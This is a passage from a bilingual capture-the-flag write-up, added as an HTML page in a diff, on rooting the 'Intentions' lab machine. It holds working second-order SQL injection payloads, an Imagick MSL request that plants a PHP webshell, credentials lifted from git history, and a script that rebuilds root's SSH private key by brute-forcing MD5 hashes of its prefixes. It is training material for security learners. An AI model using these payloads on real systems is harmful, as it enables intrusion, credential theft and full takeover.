+        <span style="color:#d19a66;">TEST_HASH</span>=$(<span style="color:#61afef;">echo</span> -n <span style="color:#98c379;">"$TEST_STRING"</span> | <span style="color:#61afef;">md5sum</span> | <span style="color:#61afef;">awk</span> <span style="color:#98c379;">'{print $1}'</span>)
+
+        <span style="color:#c678dd;">if</span> [ <span style="color:#98c379;">"$TEST_HASH"</span> == <span style="color:#98c379;">"$TARGET_HASH"</span> ]; <span style="color:#c678dd;">then</span>
+            <span style="color:#d19a66;">RESULT</span>=<span style="color:#98c379;">"$TEST_STRING"</span>
+            <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[+] Found character at position $LENGTH: '$char'"</span>
+            <span style="color:#d19a66;">FOUND</span>=<span style="color:#d19a66;">true</span>
+            <span style="color:#c678dd;">break</span>
+        <span style="color:#c678dd;">fi</span>
+    <span style="color:#c678dd;">done</span> &lt; &lt;(<span style="color:#61afef;">echo</span> -n <span style="color:#98c379;">"$CHARSET"</span> | <span style="color:#61afef;">fold</span> -w1)
+
+    <span style="color:#c678dd;">if</span> [ <span style="color:#98c379;">"$FOUND"</span> = <span style="color:#d19a66;">false</span> ]; <span style="color:#c678dd;">then</span>
+        <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[!] No matching character found for length $LENGTH"</span>
+        <span style="color:#c678dd;">break</span>
+    <span style="color:#c678dd;">fi</span>
+
+    <span style="color:#d19a66;">LENGTH</span>=$((<span style="color:#d19a66;">LENGTH</span> + 1))
+
+    <span style="color:#c678dd;">if</span> [ <span style="color:#98c379;">"$LENGTH"</span> -gt 10000 ]; <span style="color:#c678dd;">then</span>
+        <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[!] Reached safety limit of 10000 characters"</span>
+        <span style="color:#c678dd;">break</span>
+    <span style="color:#c678dd;">fi</span>
+<span style="color:#c678dd;">done</span>
+
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">""</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Extraction complete!"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Total characters extracted: ${#RESULT}"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"=== EXTRACTED CONTENT ==="</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"$RESULT"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"========================="</span>
+
+<span style="color:#d19a66;">OUTPUT_FILE</span>=<span style="color:#98c379;">"extracted_$(basename $FILE_PATH)"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"$RESULT"</span> &gt; <span style="color:#98c379;">"$OUTPUT_FILE"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Saved to: $OUTPUT_FILE"</span></code></pre>
+
+                <p>After running for a while, the script successfully reconstructs the full private key:</p>
+
+                <pre><code class="language-plaintext">[*] Extraction complete!
+[*] Total characters extracted: 2602
+
+=== EXTRACTED CONTENT ===
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAA
+(...)
+-----END OPENSSH PRIVATE KEY-----
+=========================</code></pre>
+
+                <p>Copying the key to the attacker machine, setting the correct permissions, and SSH-ing in as root:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">chmod</span> 600 extracted_id_rsa
+<span style="color:#61afef;">ssh</span> -i extracted_id_rsa root@10.129.229.27</code></pre>
+
+                <p>Root access obtained. Machine complete.</p>
+            </div>
+
+            <!-- ==================== ESPAÑOL ==================== -->
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>La máquina exponía una galería de imágenes construida sobre Laravel. Tras registrar una cuenta y explorar la aplicación, el campo de géneros favoritos resultó ser vulnerable a una <strong>inyección SQL de segundo orden</strong>: el payload se almacena sin problema, pero se inyecta en la query sin sanitizar cuando el feed carga los resultados. Esto permitió enumerar toda la base de datos y extraer los hashes bcrypt de los administradores.</p>
+
+                    <p>Crackear esos hashes no fue viable, pero un archivo <code>admin.js</code> accesible públicamente reveló la existencia de una <strong>API v2</strong> que acepta el hash bcrypt directamente como credencial, sin necesidad de la contraseña en texto plano. Usando el hash extraído para autenticarse como <code>greg</code> se obtuvo acceso al panel de administración, que incluía un endpoint de edición de imágenes con <strong>Imagick</strong>.</p>
+
+                    <p>Dicho endpoint era vulnerable a <strong>SSRF</strong>, y combinando la subida de archivos temporales PHP (<code>multipart/form-data</code>), el lenguaje de scripting <strong>MSL de Imagick</strong> y el protocolo glob <code>vid:</code>, fue posible escribir una webshell PHP en un directorio público, logrando ejecución remota de código como <code>www-data</code>.</p>
+
+                    <p>Desde ahí, un directorio <code>.git</code> olvidado en producción contenía un commit con credenciales en texto plano para el usuario <code>greg</code>, lo que permitió el movimiento lateral y la obtención de la flag de usuario. Finalmente, el binario <code>scanner</code> en <code>/opt</code> tenía la capability <code>cap_dac_read_search</code>, lo que le permite leer cualquier archivo del sistema. Mediante fuerza bruta del hash MD5 de prefijos progresivamente más largos de <code>/root/.ssh/id_rsa</code>, un script reconstruyó la clave privada carácter a carácter, dando acceso SSH como <code>root</code>.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo nmap para identificar puertos abiertos y servicios en ejecución:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>   <span style="color:#e06c75;">STATE</span> <span style="color:#e06c75;">SERVICE</span> <span style="color:#e06c75;">VERSION</span>
+<span style="color:#98c379;">22/tcp</span> open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
+|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
+<span style="color:#98c379;">80/tcp</span> open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Intentions
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Dos puertos abiertos: SSH en el 22 y un servidor web nginx en el puerto 80. Empezamos por la aplicación web.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>Navegando al puerto 80 aparece una galería de imágenes con una página de login y registro:</p>
+
+                <img src="./media/image2.png" alt="Aplicación web de galería de imágenes mostrando la página de login y registro" />
+
+                <p>Tras registrar una cuenta y explorar la aplicación, el fuzzing de directorios revela estas rutas:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">301</span> /css      → http://10.129.229.27/css/
+<span style="color:#98c379;">302</span> /logout   → http://10.129.229.27
+<span style="color:#98c379;">302</span> /admin    → http://10.129.229.27
+<span style="color:#98c379;">301</span> /fonts    → http://10.129.229.27/fonts/
+<span style="color:#98c379;">302</span> /gallery  → http://10.129.229.27/gallery
+<span style="color:#98c379;">301</span> /js       → http://10.129.229.27/js/
+<span style="color:#98c379;">301</span> /storage  → http://10.129.229.27/storage/</code></pre>
+
+                <p>Revisando el historial HTTP en Burp Suite, los datos del perfil del usuario actual tienen esta pinta:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"status"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">"success"</span><span style="color:#abb2bf;">,</span><span style="color:#98c379;">"data"</span><span style="color:#abb2bf;">:{</span><span style="color:#98c379;">"id"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">28</span><span style="color:#abb2bf;">,</span><span style="color:#98c379;">"name"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">"asd"</span><span style="color:#abb2bf;">,</span><span style="color:#98c379;">"email"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">"asd@asd.com"</span><span style="color:#abb2bf;">,</span><span style="color:#98c379;">"admin"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">0</span><span style="color:#abb2bf;">,</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">"asd"</span><span style="color:#e06c75;">}}</span></code></pre>
+
+                <p>El campo <code>"admin": 0</code> llama la atención — podría ser interesante intentar modificarlo de alguna manera.</p>
+
+                <h2>Inyección SQL de Segundo Orden vía Géneros Favoritos</h2>
+                <p>Explorando más la aplicación, la funcionalidad más interesante es la actualización de géneros favoritos:</p>
+
+                <img src="./media/image4.png" alt="Formulario de actualización de géneros favoritos mostrando el campo de entrada separado por comas" />
+
+                <p>Los géneros se introducen como una cadena separada por comas y se envían por POST a <code>/api/v1/gallery/user/genres</code>:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"nature,food"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <p>La galería tiene cuatro categorías de imágenes almacenadas en estas rutas:</p>
+                <pre><code class="language-plaintext">public/food
+public/animals
+public/architecture
+public/nature</code></pre>
+
+                <p>Al establecer un género y visitar "Mi Feed" se muestran las imágenes correspondientes, lo que confirma que el valor de géneros se usa directamente en una consulta a base de datos. Introducir una comilla simple al final (<code>nature'</code>) como género y luego cargar el feed provoca un <strong>error 500</strong>, lo que sugiere que el carácter inyectado rompe una query SQL en el momento de la lectura, no al escribir. Esta es la esencia de una <strong>inyección SQL de segundo orden</strong>: el payload se guarda sin problema, pero se inyecta sin sanitizar en la query cuando se renderiza el feed.</p>
+
+                <p>Probando más, este payload confirma la inyección y devuelve todas las imágenes:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"a')OR\t1=1--\t-"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <p>El paréntesis de cierre es necesario porque la query del backend tiene probablemente esta estructura:</p>
+
+                <pre><code class="language-sql"><span style="color:#c678dd;">SELECT</span> <span style="color:#abb2bf;">*</span> <span style="color:#c678dd;">FROM</span> gallery
+<span style="color:#c678dd;">WHERE</span> genre <span style="color:#c678dd;">IN</span> (<span style="color:#d19a66;">$input</span>);</code></pre>
+
+                <p>Con el payload queda así:</p>
+
+                <pre><code class="language-sql"><span style="color:#c678dd;">SELECT</span> <span style="color:#abb2bf;">*</span> <span style="color:#c678dd;">FROM</span> gallery
+<span style="color:#c678dd;">WHERE</span> genre <span style="color:#c678dd;">IN</span> (<span style="color:#d19a66;">'a'</span>) <span style="color:#c678dd;">OR</span> <span style="color:#d19a66;">1</span><span style="color:#abb2bf;">=</span><span style="color:#d19a66;">1</span><span style="color:#abb2bf;">-- -);</span></code></pre>
+
+                <h3>Enumeración de la Base de Datos</h3>
+                <p>Probando una inyección UNION para identificar el número de columnas y encontrar la que se refleja en el HTML:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"a')UNION\tSELECT\t1,2,3,4,5--\t-"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <img src="./media/image1.png" alt="Página de feed mostrando el output del UNION SELECT con la columna 3 reflejada en el HTML" />
+
+                <p>La columna 3 se refleja en el output. A partir de aquí enumero la metadata de la base de datos:</p>
+
+                <pre><code class="language-plaintext">version():  10.6.12-MariaDB-0ubuntu0.22.04.1
+database(): intentions</code></pre>
+
+                <p>Extraigo los nombres de las tablas:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"a')UNION\tSELECT\t1,2,group_concat(table_name),4,5\tFROM\tinformation_schema.tables\tWHERE\ttable_schema=database()--\t-"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <pre><code class="language-plaintext">gallery_images, personal_access_tokens, migrations, users</code></pre>
+
+                <p>Enumero las columnas de la tabla <code>users</code>:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"a')UNION\tSELECT\t1,2,group_concat(column_name),4,5\tFROM\tinformation_schema.columns\tWHERE\ttable_schema=database()\tAND\ttable_name='users'--\t-"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <pre><code class="language-plaintext">id, name, email, password, created_at, updated_at, admin, genres</code></pre>
+
+                <p>Extraigo los usuarios administradores:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"a')UNION\tSELECT\t1,2,group_concat(id,name,email,password,admin),4,5\tFROM\tusers\tWHERE\tadmin=1--\t-"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <pre><code class="language-plaintext">1stevesteve@intentions.htb$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa1
+2greggreg@intentions.htb$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m1</code></pre>
+
+                <p>Dos cuentas de administrador: <code>steve</code> y <code>greg</code>. Intentar crackear ambos hashes con hashcat no da resultado — bcrypt con una contraseña fuerte no es viable por fuerza bruta. Toca buscar otro ángulo.</p>
+
+                <h2>Descubriendo la API v2 a través de admin.js</h2>
+                <p>Enumerando los archivos JavaScript accesibles en el servidor:</p>
+
+                <pre><code class="language-plaintext">200 GET  http://10.129.229.27/js/login.js
+200 GET  http://10.129.229.27/js/admin.js
+200 GET  http://10.129.229.27/js/app.js
+200 GET  http://10.129.229.27/js/gallery.js</code></pre>
+
+                <p>El archivo <code>admin.js</code> es accesible incluso sin privilegios de admin. Está muy ofuscado, pero buscando patrones de URL cerca del final del archivo aparecen endpoints muy interesantes:</p>
+
+                <pre><code class="language-plaintext">/api/v2/admin/image/modify
+/api/v2/admin/users
+/api/v2/gallery/images
+/api/v2/admin/image/{id}</code></pre>
+
+                <p>También casi al final del archivo hay un mensaje de changelog embebido que contiene varios datos clave:</p>
+
+                <blockquote>
+                    <p>"Hey team, I've deployed the v2 API to production and have started using it in the admin section. This will be a major security upgrade for our users, <strong>passwords no longer need to be transmitted to the server in clear text! By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.</strong> The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images [...] feel free to browse all of the available effects for the module: <a href="https://www.php.net/manual/en/class.imagick.php">https://www.php.net/manual/en/class.imagick.php</a>"</p>
+                </blockquote>
+
+                <p>Esto nos dice varias cosas a la vez: la API v2 acepta el <strong>hash bcrypt directamente</strong> como credencial en lugar de la contraseña en texto plano, y la edición de imágenes usa <strong>PHP Imagick</strong>. Ambas cosas son inmediatamente aprovechables.</p>
+
+                <h3>Acceso a la API v2 e Inicio de Sesión como Admin</h3>
+                <p>El fuzzing confirma que la API v2 tiene sus propios endpoints de autenticación:</p>
+
+                <pre><code class="language-plaintext">422 POST  /api/v2/auth/login
+422 POST  /api/v2/auth/register
+302 GET   /api/v2/auth/user</code></pre>
+
+                <p>Un 422 significa que la ruta es válida pero el body no coincide con lo esperado. Probando el endpoint de login confirma que requiere un campo <code>hash</code> en lugar de <code>password</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#d19a66;">-X POST</span> <span style="color:#98c379;">"http://10.129.229.27/api/v2/auth/login"</span> \
+  <span style="color:#d19a66;">-d</span> <span style="color:#98c379;">'{"email":"greg@intentions.htb"}'</span> \
+  <span style="color:#d19a66;">-H</span> <span style="color:#98c379;">"Content-Type: application/json"</span>
+
+<span style="color:#abb2bf;">{"status":"error","errors":{"hash":["The hash field is required."]}}</span></code></pre>
+
+                <p>Como ya tenemos el hash bcrypt de Greg gracias a la inyección SQL, lo usamos directamente como valor de <code>hash</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#d19a66;">-X POST</span> <span style="color:#98c379;">"http://10.129.229.27/api/v2/auth/login"</span> \
+  <span style="color:#d19a66;">-d</span> <span style="color:#98c379;">'{"email":"greg@intentions.htb", "hash": "$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m"}'</span> \
+  <span style="color:#d19a66;">-H</span> <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  <span style="color:#d19a66;">-x</span> http://localhost:8080
+
+<span style="color:#abb2bf;">{"status":"success","name":"greg"}</span></code></pre>
+
+                <p>Burp Suite captura la cookie JWT en la respuesta:</p>
+
+                <pre><code class="language-plaintext">Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiO...</code></pre>
+
+                <p>Estableciendo esta cookie en el navegador se obtiene acceso al panel de administración, donde podemos ver todos los usuarios, todas las imágenes, y — lo más importante — aplicar efectos de imagen a través del endpoint respaldado por Imagick.</p>
+
+                <h2>RCE vía SSRF + Archivos Temporales PHP + MSL de Imagick</h2>
+                <p>En el panel de administración, cada imagen tiene una vista de edición con cuatro efectos disponibles:</p>
+
+                <img src="./media/image3.png" alt="Vista de edición de imagen en el panel de administración mostrando los cuatro efectos de Imagick disponibles" />
+
+                <p>Aplicar un efecto envía este request POST:</p>
+
+                <pre><code class="language-json"><span style="color:#c678dd;">POST</span> /api/v2/admin/image/modify
+
+<span style="color:#e06c75;">{</span>
+  <span style="color:#98c379;">"path"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg"</span><span style="color:#abb2bf;">,</span>
+  <span style="color:#98c379;">"effect"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"wave"</span>
+<span style="color:#e06c75;">}</span></code></pre>
+
+                <p>Esto también revela una ruta del sistema de archivos: <code>/var/www/html/intentions/storage/app/public/</code>. Pasar una ruta local como <code>/etc/passwd</code> devuelve un error 422 "bad image path", pero una URL apuntando a nuestra máquina atacante funciona — confirmando <strong>SSRF</strong>:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"path"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"http://10.10.14.172:8000/potato.jpg"</span><span style="color:#abb2bf;">, </span><span style="color:#98c379;">"effect"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"wave"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">python3</span> -m http.server 8000
+<span style="color:#7f848e;"># Serving HTTP on 0.0.0.0 port 8000 ...
+# 10.129.229.27 - - "GET /potato.jpg HTTP/1.1" 200 -</span></code></pre>
+
+                <p>El servidor hace fetch de la imagen — SSRF confirmado. Ahora viene el exploit en sí.</p>
+
+                <h3>Entendiendo la Cadena de Explotación</h3>
+                <p>La técnica está documentada en detalle en <a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/</a>. Abusa de tres mecanismos distintos de forma simultánea:</p>
+
+                <ol>
+                    <li><strong>Archivos temporales PHP</strong> — cuando se recibe un request <code>multipart/form-data</code> con un archivo, PHP lo guarda en <code>/tmp/phpXXXXXX</code> durante la duración del request.</li>
+                    <li><strong>MSL de Imagick (Magick Scripting Language)</strong> — Imagick soporta un formato de scripting XML que puede instruirle para leer contenido y escribirlo en rutas arbitrarias.</li>
+                    <li><strong>El protocolo glob <code>vid:</code></strong> — el protocolo <code>vid:</code> de Imagick puede hacer match de nombres de archivo con wildcards, permitiéndonos referenciar el archivo temporal PHP como <code>vid:msl:/tmp/php*</code> sin conocer su nombre aleatorio exacto.</li>
+                </ol>
+
+                <p>El código Imagick del backend es esencialmente esto:</p>
+
+                <pre><code class="language-php"><span style="color:#d19a66;">$path</span>   <span style="color:#abb2bf;">= </span><span style="color:#e06c75;">$_GET</span><span style="color:#abb2bf;">[</span><span style="color:#98c379;">'path'</span><span style="color:#abb2bf;">]; </span><span style="color:#7f848e;">// lo controlamos nosotros</span>
+<span style="color:#d19a66;">$effect</span> <span style="color:#abb2bf;">= </span><span style="color:#e06c75;">$_GET</span><span style="color:#abb2bf;">[</span><span style="color:#98c379;">'effect'</span><span style="color:#abb2bf;">];
+</span><span style="color:#d19a66;">$imagick</span> <span style="color:#abb2bf;">= </span><span style="color:#c678dd;">new</span> <span style="color:#e5c07b;">Imagick</span><span style="color:#abb2bf;">(</span><span style="color:#d19a66;">$path</span><span style="color:#abb2bf;">);</span></code></pre>
+
+                <p>Podemos pasar los parámetros como query strings para liberar el body para la subida multipart. Esto se verifica primero:</p>
+
+                <pre><code class="language-http"><span style="color:#c678dd;">POST</span> /api/v2/admin/image/modify?path=http://10.10.14.137:8000/test.jpg&amp;effect=charcoal HTTP/1.1</code></pre>
+
+                <p>El servidor Python sigue recibiendo el request, así que los query parameters funcionan igual que los parámetros en el body.</p>
+
+                <h3>Construyendo el Request de Explotación</h3>
+                <p>El archivo MSL le indica a Imagick que escriba una webshell PHP en el directorio de almacenamiento público:</p>
+
+                <pre><code class="language-xml"><span style="color:#7f848e;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span style="color:#e06c75;">&lt;image&gt;</span>
+  <span style="color:#98c379;">&lt;read</span> <span style="color:#d19a66;">filename</span><span style="color:#abb2bf;">=</span><span style="color:#e5c07b;">"caption:&lt;?php system($_GET['cmd']); ?&gt;"</span> <span style="color:#98c379;">/&gt;</span>
+  <span style="color:#98c379;">&lt;write</span> <span style="color:#d19a66;">filename</span><span style="color:#abb2bf;">=</span><span style="color:#e5c07b;">"info:/var/www/html/intentions/storage/app/public/pwn.php"</span> <span style="color:#98c379;">/&gt;</span>
+<span style="color:#e06c75;">&lt;/image&gt;</span></code></pre>
+
+                <p>Y el request completo que lo entrega:</p>
+
+                <pre><code class="language-http"><span style="color:#c678dd;">POST</span> /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&amp;effect=charcoal HTTP/1.1
+Host: 10.129.229.27
+Content-Type: multipart/form-data; boundary=------------------------xd
+Cookie: XSRF-TOKEN={token}; token={token}
+
+<span style="color:#abb2bf;">--------------------------xd
+Content-Disposition: form-data; name="file"; filename="test.msl"
+Content-Type: application/octet-stream
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;image&gt;
+  &lt;read filename="caption:&lt;?php system($_GET['cmd']); ?&gt;" /&gt;
+  &lt;write filename="info:/var/www/html/intentions/storage/app/public/pwn.php" /&gt;
+&lt;/image&gt;
+--------------------------xd</span></code></pre>
+
+                <p>Cuando se procesa este request: PHP guarda el archivo MSL subido en <code>/tmp/phpXXXXXX</code>; Imagick se instancia con <code>vid:msl:/tmp/php*</code>, que hace glob al archivo temporal; Imagick parsea el MSL y escribe la webshell en el directorio público. El servidor devuelve un 502, pero el archivo ya ha sido creado:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#98c379;">"http://10.129.229.27/storage/pwn.php?cmd=id"</span></code></pre>
+
+                <pre><code class="language-plaintext">caption:uid=33(www-data) gid=33(www-data) groups=33(www-data) CAPTION 120x120 120x120+0+0 16-bit sRGB</code></pre>
+
+                <p>Ejecución de código confirmada. Sustituyendo <code>id</code> por un payload de reverse shell obtenemos una shell como <code>www-data</code>.</p>
+
+                <h2>Movimiento Lateral a greg</h2>
+                <p>Una vez dentro, hay tres usuarios en <code>/home</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> -lah /home
+<span style="color:#abb2bf;">drwxr-x--- 4 greg   greg   4.0K Jun 19 2023 greg
+drwxr-x--- 4 legal  legal  4.0K Jun 19 2023 legal
+drwxr-x--- 4 steven steven 4.0K Jun 19 2023 steven</span></code></pre>
+
+                <p>El proyecto es una aplicación Laravel. El archivo <code>.env</code> en la raíz del proyecto contiene credenciales de base de datos:</p>
+
+                <pre><code class="language-ini"><span style="color:#d19a66;">DB_CONNECTION</span><span style="color:#abb2bf;">=mysql
+</span><span style="color:#d19a66;">DB_HOST</span><span style="color:#abb2bf;">=localhost
+</span><span style="color:#d19a66;">DB_PORT</span><span style="color:#abb2bf;">=3306
+</span><span style="color:#d19a66;">DB_DATABASE</span><span style="color:#abb2bf;">=intentions
+</span><span style="color:#d19a66;">DB_USERNAME</span><span style="color:#abb2bf;">=laravel
+</span><span style="color:#d19a66;">DB_PASSWORD</span><span style="color:#abb2bf;">=02mDWOgsOga03G385!!3Plcx</span></code></pre>
+
+                <p>Estas credenciales no sirven para ningún usuario del sistema. Comprobando los grupos de cada usuario:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">id</span> greg
+<span style="color:#abb2bf;">uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)</span>
+
+<span style="color:#61afef;">id</span> steven
+<span style="color:#abb2bf;">uid=1000(steven) gid=1000(steven) groups=1000(steven),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)</span>
+
+<span style="color:#61afef;">id</span> legal
+<span style="color:#abb2bf;">uid=1002(legal) gid=1002(legal) groups=1002(legal),1003(scanner)</span></code></pre>
+
+                <p>Existe un grupo <code>scanner</code> — tanto <code>greg</code> como <code>legal</code> son miembros. Hay un binario en <code>/opt/scanner</code> accesible a ese grupo, así que conseguir acceso lateral a cualquiera de ellos parece interesante.</p>
+
+                <h3>Credenciales en el Historial de Git</h3>
+                <p>El proyecto tiene un directorio <code>.git</code> que se olvidó en producción. Ejecutar <code>git log</code> directamente falla por comprobaciones de propiedad, pero los objetos git son simplemente archivos — podemos archivar todo el proyecto y examinarlo en local:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">tar</span> czf /tmp/project.tar.gz /var/www/html/intentions/
+<span style="color:#7f848e;"># luego transferir a la máquina atacante mediante servidor Python</span></code></pre>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">git</span> log
+
+<span style="color:#abb2bf;">commit 1f29dfde45c21be67bb2452b46d091888ed049c3 (HEAD -> master)
+Author: steve &lt;steve@intentions.htb&gt;
+    Fix webpack for production
+
+commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
+Author: greg &lt;greg@intentions.htb&gt;
+    Test cases did not work on steve's local database, switching to user factory per his advice
+
+commit 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
+Author: greg &lt;greg@intentions.htb&gt;
+    Adding test cases for the API!
+
+commit d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd
+Author: steve &lt;steve@intentions.htb&gt;
+    Initial v2 commit</span></code></pre>
+
+                <p>El commit de Greg sobre el cambio de base de datos tiene mala pinta. Lo inspecciono:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">git</span> show f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4</code></pre>
+
+                <pre><code class="language-diff"><span style="color:#abb2bf;">diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
+--- a/tests/Feature/Helper.php
++++ b/tests/Feature/Helper.php
+@@ -8,12 +8,14 @@ class Helper extends TestCase
+ {
+     public static function getToken($test, $admin = false) {
+         if($admin) {
+<span style="color:#e06c75;">-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);</span>
+<span style="color:#e06c75;">-            return $res->headers->get('Authorization');</span>
+<span style="color:#98c379;">+            $user = User::factory()->admin()->create();</span>
+         }
+         else {
+<span style="color:#e06c75;">-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);</span>
+<span style="color:#e06c75;">-            return $res->headers->get('Authorization');</span>
+<span style="color:#98c379;">+            $user = User::factory()->create();</span></span></code></pre>
+
+                <p>Credenciales de Greg hardcodeadas: <code>Gr3g1sTh3B3stDev3l0per!1998!</code>. Las uso para cambiar al usuario:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">su</span> greg
+<span style="color:#7f848e;"># Contraseña: Gr3g1sTh3B3stDev3l0per!1998!</span></code></pre>
+
+                <p>Ya somos <code>greg</code> y podemos leer la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios vía Binario scanner (cap_dac_read_search)</h2>
+                <p>En <code>/opt/scanner</code> hay un binario Go enlazado estáticamente:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> -lah /opt/scanner
+<span style="color:#abb2bf;">-rwxr-x--- 1 root scanner 1.4M Jun 19 2023 scanner</span>
+
+<span style="color:#61afef;">file</span> scanner
+<span style="color:#abb2bf;">scanner: ELF 64-bit LSB executable, x86-64, statically linked, Go BuildID=..., stripped</span></code></pre>
+
+                <p>Al ejecutarlo se muestra que es un escáner de copyright que compara hashes de archivos contra una lista negra. Compruebo sus capabilities:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">getcap</span> /opt/scanner/scanner
+<span style="color:#abb2bf;">scanner cap_dac_read_search=ep</span></code></pre>
+
+                <p>La capability <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><code>CAP_DAC_READ_SEARCH</code></a> omite todas las comprobaciones de permisos de lectura de archivos y de lectura/ejecución de directorios. En otras palabras, este binario puede leer <em>cualquier archivo del sistema</em> independientemente de su propietario o permisos.</p>
+
+                <p>Las flags más relevantes del binario son:</p>
+                <ul>
+                    <li><code>-c</code> — ruta a un único archivo a comprobar</li>
